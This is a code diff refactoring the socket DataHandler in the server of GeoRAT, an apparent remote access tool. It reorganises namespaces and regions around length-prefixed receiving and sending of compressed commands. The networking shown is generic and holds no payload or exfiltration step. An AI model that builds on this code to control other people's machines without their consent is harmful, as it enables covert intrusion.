@@ -2,8 +2,8 @@
 using System.Net.Sockets;
 using System.Threading;
 using System.Windows.Forms;
-using GeoRAT.Server.CommandHandlers;
-using GeoRAT.Server.Compressor;
+using GeoRAT.Core.Commands;
+using GeoRAT.Core.Compressor;
 
 namespace GeoRAT.Server.Net
 {
@@ -12,31 +12,38 @@ namespace GeoRAT.Server.Net
     /// </summary>
     class DataHandler
     {
-        //Delegates and events//
+        #region Declarations
+
         public delegate void Received(byte[] buf, Socket received);
         public event Received OnReceived;
         public delegate void Disconnected(Socket s);
         public event Disconnected OnDisconnected; 
-        //--------------------------// 
 
 
         private Socket DataSocket;  //Reads data sent by client, first it reads data length, then data itself 
         private Socket DummySocket;  //Actually does nothing, just checks if socket is connected, if not, raises disconnected event
         byte[] PrefixBuffer = new byte[4]; //Buffer to store Message length 
         private static int MessageLength = 0; //Message length sent by client 
-         
+        #endregion
 
-        //Constructor 
+        #region Constructor
+
         public DataHandler(Socket s)
         {
             DataSocket = s;
             DummySocket = DataSocket;
             DataSocket.BeginReceive(PrefixBuffer, 0, 4, SocketFlags.None, ReceivedCallback, null); //Begin reading asynchronously
-            DummySocket.BeginReceive(new byte[] {0}, 0, 0, SocketFlags.None, Dummy, null);  //Dummy function 
-                                             
+            DummySocket.BeginReceive(new byte[] { 0 }, 0, 0, SocketFlags.None, Dummy, null);  //Dummy function 
+
         }
 
+        #endregion
+
+
+        #region Dummy
+
         //Dummy Callback, Raises disconnection event  if it can't read from socket 
+
         private void Dummy(IAsyncResult result)
         {
             try
@@ -51,6 +58,9 @@ namespace GeoRAT.Server.Net
            }
 
         }
+        #endregion
+
+        #region Receive_Length
 
         //Here we actually begin reading data from socket. Reads Length of message sent by client in this function 
         private void ReceivedCallback(IAsyncResult result)
@@ -65,18 +75,22 @@ namespace GeoRAT.Server.Net
                 }
                 DataSocket.Receive(PrefixBuffer, total, left, SocketFlags.None); //Get all bytes now 
                 var len = BitConverter.ToInt32(PrefixBuffer, 0); //Deserialize received bytes back to INT and get length of packet
-                MessageLength = len; //Assign length to global variable
+                MessageLength = len; //Assign length to global constant 
                 ReceiveMessage(MessageLength); //Begin reading incoming packets based on length now 
-                
+
             }
-            catch 
+            catch
             {
                 OnDisconnected?.Invoke(DataSocket);
-                
+
             }
         }
 
-       
+
+        #endregion
+
+        #region Receive_Data
+
         //Reads incoming data from client, based on length of data we got earlier 
         //Keeps reading until it gets exact amount of bytes we need 
         private void ReceiveMessage(int size)
@@ -98,22 +112,24 @@ namespace GeoRAT.Server.Net
                 OnReceived?.Invoke(buffer, DataSocket);
 
             }
-            catch  
+            catch
             {
-                
+
                 OnDisconnected?.Invoke(DataSocket);
             }
-    }
-        
-        //This function sends bytes back to client 
-        //It receives Commands object, serializes it to byte[] array, compresses it and then sends 
+        }
+
+        #endregion
+
+
+        #region Send
         public void Send(Commands command)
 
         {
             try
             {
-                CommandSerializer Serializer = new CommandSerializer();
-                byte[] packet = Serializer.Serialize(command);
+                CommandSerializer serializer = new CommandSerializer();
+                byte[] packet = serializer.Serialize(command);
                 var cmpr = Compression.Compress(packet);
                 var len2 = cmpr.Length;
                 DataSocket.Send(BitConverter.GetBytes(len2));
@@ -131,6 +147,10 @@ namespace GeoRAT.Server.Net
         {
             DataSocket.EndSend(result);
         }
+
+
+
+        #endregion
 
     }
 }
